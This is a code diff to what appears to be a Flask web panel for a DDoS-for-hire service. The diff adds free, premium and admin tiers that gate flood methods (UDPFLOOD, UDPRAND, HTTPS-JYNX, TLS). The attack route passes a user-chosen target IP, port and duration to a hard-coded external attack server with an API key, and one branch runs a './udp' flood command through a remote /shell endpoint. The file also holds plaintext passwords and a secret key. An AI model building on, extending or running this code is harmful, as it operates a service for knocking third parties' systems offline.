@@ -16,10 +16,17 @@ app.secret_key = 'Eralp13092012'
 users = {
     'eralp': {
         'password': 'Eralp13092012',
-        'online': False
+        'role': 'admin',
+        'online': True
     },
     'root': {
         'password': 'password',
+        'role': 'premium',
+        'online': True
+    },
+    'guest': {
+        'password': 'guest123',
+        'role': 'free',
         'online': True
     }
 }
@@ -96,6 +103,7 @@ def login():
         ):
             users[username]['online'] = True
             session['username'] = username
+            session['role'] = users[username]['role']
             return redirect(url_for('index'))
 
         flash('Неверный логин или токен!')
@@ -132,12 +140,33 @@ def launch_attack():
     port = request.form['port']
     duration = request.form['duration']
     method = request.form['method']
+    
+    role = session.get('role', 'free')
 
+free_methods = ['FREE-scan']
+premium_methods = [
+    'UDPFLOOD',
+    'UDPRAND',
+    'HTTPS-JYNX',
+    'TLS'
+]
+
+if role == 'admin':
+    pass
+
+elif role == 'premium':
+    if method not in free_methods + premium_methods:
+        return "Method not valid", 403
+
+else:
+    if method not in free_methods:
+        return "Premium Acces", 403
+        
     print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
     if method == "UDPFLOOD":
         url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
         requests.get(url)
-    if method == "UDPRAND":
+    elif method == "UDPRAND":
         url = f"http://217.144.185.177:5000/shell?command=./udp {target} {port} 1000 1000 {duration}&key=kriskaUSDEGR454T"
         requests.get(url)
     elif method == "HTTPS-JYNX":
